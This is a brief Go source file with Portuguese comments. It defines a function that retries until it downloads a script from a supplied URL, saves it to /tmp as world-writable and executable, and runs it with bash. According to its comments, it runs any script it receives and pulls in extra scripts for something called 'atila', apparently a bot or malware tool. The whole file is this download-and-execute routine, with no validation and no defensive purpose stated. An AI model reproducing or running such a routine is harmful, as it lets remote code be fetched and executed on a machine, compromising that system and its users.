package main


import (


"net/http"
"io/ioutil"
"os/exec"



)






//essa funcao executara  qualque script   que ela  recebe





func  utils_down (link  string  ,   script_name string )  {  //downloads  de scripts  adcionais  para atila  





for   {



cli := http.Client{}


resp , err_get := cli.Get(link)


 if err_get != nil {


  
          continue


   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


      
           continue



            }



ioutil.WriteFile("/tmp/" + script_name  , script , 0777 )


script_  := exec.Command("sh" , "-c" , "cd /tmp ; bash " + script_name)
 


script_.Run()


return 


} //loop

}













